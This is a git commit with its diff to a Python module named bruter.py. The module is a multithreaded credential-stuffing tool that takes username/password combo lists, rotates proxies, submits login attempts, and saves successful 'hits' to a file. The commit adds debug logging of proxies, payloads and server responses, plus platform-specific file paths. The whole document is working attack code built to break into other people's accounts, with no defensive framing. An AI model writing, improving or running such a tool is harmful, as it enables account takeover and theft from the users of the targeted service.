68c8bd055e8c31ab583a18fcf55123c9a5eb3e3d
Castorp <phohgh7Ve5u@protonmail.com>
2019-02-23 13:42:47 +0000

    Overall change: classes reworked
    generates paths to hits.txt and debug.txt (new) on it's own;
    implemented debug option that logs successful requests to debug.txt;
    added a few comments

--- module/bruter.py
+++ module/bruter.py
@@ -1,18 +1,21 @@
 from .browser import Browser
-from .const import (response_success, response_error)
+from .const import (debug, response_success, response_error)
+from sys import (path, platform)
 from threading import Thread
 from time import sleep
 
 
 class Bruter:
 
-    def __init__(self, input_max_threads, combo_queue, proxy_manager, path_hits_file):
-        self.combo_queue = combo_queue
-        self.proxy_manager = proxy_manager
-        self.path_hits_file = path_hits_file
+    def __init__(self, max_threads, combo_queue, proxy_manager):
+        self.combo_queue = combo_queue  # type = deque
+        self.proxy_manager = proxy_manager  # type = class
+        self.path_hits_file = None
+        self.path_debug_file = None
         self.bots = []  # [thread1, ...]
+        self.debug_messages = []  # [request1, ...]
         self.last_combo = ['', '']  # [username, password]
-        self.max_threads = input_max_threads
+        self.max_threads = max_threads
         self.hits = 0
         self.tested = 0
         self.retries = 0
@@ -21,7 +24,7 @@ class Bruter:
     def login(self, combo, proxy):
         try:
             browser = Browser()
-            browser.create()
+            browser.create_session()
             browser.set_details(combo, proxy)
             browser.set_header()
             browser.build_payload()
@@ -32,6 +35,14 @@ class Bruter:
                     self.proxy_manager.disable(proxy, tested=True)
                     self.tested += 1
                     self.last_combo = combo
+
+                    if debug:
+
+                        debug_message = ('Proxy: ' + proxy[0] + ' (' + proxy[1] + '); \t' +
+                                         'Payload: ' + str(browser.payload) + '; \t' +
+                                         'Response: ' + response.text + ';\n')
+
+                        self.debug_messages.append(debug_message)
 
                     if response_success in response.text:
                         hits_file = open(self.path_hits_file, 'a+', encoding='utf-8', errors='ignore')
@@ -59,6 +70,17 @@ class Bruter:
             proxy = self.proxy_manager.get()
             self.login(combo, proxy)
 
+    def log(self):
+        while self.isAlive:
+            if len(self.debug_messages):
+                debug_message = self.debug_messages.pop()
+                debug_file = open(self.path_debug_file, 'a+', encoding='utf-8', errors='ignore')
+                debug_file.write(debug_message)
+                debug_file.close()
+
+            else:
+                sleep(0.5)
+
     def stop(self):
         self.isAlive = False
         
@@ -68,10 +90,28 @@ class Bruter:
 
     def start(self):
         self.isAlive = True
+
+        # generate file paths
+        if 'linux' in platform or 'darwin' in platform:
+            path_separator = '/'
+
+        elif 'win' in platform:
+            path_separator = '\\'
+
+        else:
+            path_separator = '/'
+
+        self.path_hits_file = path[0] + path_separator + 'hits.txt'
+        self.path_debug_file = path[0] + path_separator + 'debug.txt'
+
+        # start logging requests if debug is true
+        if debug:
+            t = Thread(target=self.log)
+            t.start()
+            self.bots.append(t)
         
         # start bots
         for i in range(self.max_threads):
             t = Thread(target=self.bot)
-            t.daemon = True
             t.start()
             self.bots.append(t)
